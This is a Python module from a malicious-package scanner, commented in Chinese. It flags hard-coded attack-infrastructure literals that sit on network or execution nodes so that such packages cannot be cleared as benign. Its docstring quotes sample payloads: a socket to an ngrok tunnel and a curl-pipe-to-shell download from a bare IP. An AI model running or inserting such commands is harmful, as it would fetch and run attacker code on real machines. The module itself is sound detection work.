# -*- coding: utf-8 -*-
"""字面量证据通道（Static Literal Evidence）

动机（2026-11，1000 包评测归因）：
    污点链是 flow-based 的：source → sink。但真实恶意包里有一大类
    **零数据流的硬编码载荷**——

        s = socket.socket(...); s.connect(("4.tcp.eu.ngrok.io", 19931))
        os.system("curl -L http://1.2.3.4/x.sh | sh")

    没有 source、没有赋值传播，`analyze()` 产不出链，
    于是 `_block_gate` 不触发（它只在 SUSPICIOUS/UNKNOWN/大包时开），
    小模型拿着 1 个良性子图 0.95 置信度判 BENIGN，大模型从没看过。
    calculator_2c397c49ab20c445 就是这样漏掉的。

本模块只做一件事：**在图上找"落在连接点上的攻击基础设施字面量"**，
命中即禁止 BENIGN，把包推回两阶段/块划分，让强模型看到它。
不直接定罪——定罪权仍在 LLM + 已验证链，这里只负责"不许静默放行"。
"""
import re
from typing import Dict, List, Optional

from src.target_awareness import hostile_literal_in

# 能做网络/执行的能力：字面量必须落在这些节点上才算证据
_CAP_GATE = {'network_out', 'network_in', 'process_spawn', 'code_eval',
             'credential_access', 'privilege'}
# 代码形态兜底（capability 没标到时）
_CODE_GATE = re.compile(r'socket\.|\.connect\s*\(|requests\.|urlopen|urllib|'
                        r'os\.system|os\.popen|subprocess|Popen|exec\s*\(|eval\s*\(')
# 弱证据：Discord webhook / 可疑 TLD 在正常项目里也出现，不足以禁止 BENIGN
_WEAK_ONLY = {'exfil_endpoint'}


def _is_test_path(path: str) -> bool:
    p = (path or '').replace('\\', '/').lower()
    if not p:
        return False
    from src.benign_context import is_fixture_path
    if is_fixture_path(p):
        return True
    segs = p.split('/')
    return any(s in ('test', 'tests', 'testing', 'examples', 'example',
                     'docs', 'doc', 'fixtures', 'samples') for s in segs)


def scan(nodes: List[Dict], project_dir: str = '') -> List[Dict]:
    """在节点上找攻击基础设施字面量。

    Returns:
        [{'node_id', 'kind', 'level', 'code', 'file', 'line', 'capability'}]
        level: 'strong'（禁止 BENIGN）| 'weak'（只记录）
    """
    out = []
    for n in nodes or []:
        code = n.get('code') or ''
        if not code or len(code) > 2000:
            continue
        path = n.get('file') or ''
        if _is_test_path(path):
            continue
        kind = hostile_literal_in(code)
        if not kind:
            continue
        cap = (n.get('capability') or '').strip()
        if cap not in _CAP_GATE and not _CODE_GATE.search(code):
            continue
        out.append({
            'node_id': n.get('node_id'),
            'kind': kind,
            'level': 'weak' if kind in _WEAK_ONLY else 'strong',
            'code': code.strip()[:200],
            'file': path,
            'line': n.get('line'),
            'capability': cap,
        })
    return out


def strongest(findings: List[Dict]) -> Optional[str]:
    for f in findings or []:
        if f.get('level') == 'strong':
            return f.get('kind')
    return None


def forbid_benign(findings: List[Dict]) -> bool:
    """是否禁止 BENIGN。只有 strong 级证据才禁止（弱证据只记录）。"""
    return strongest(findings) is not None


def render(findings: List[Dict], limit: int = 5) -> str:
    if not findings:
        return ''
    lines = ['STATIC LITERAL EVIDENCE（零数据流载荷，无污点链）:']
    for f in findings[:limit]:
        lines.append(f"  [{f['kind']}] {f.get('file', '')}:{f.get('line', '')}  "
                     f"{f['code'][:120]}")
    return '\n'.join(lines)
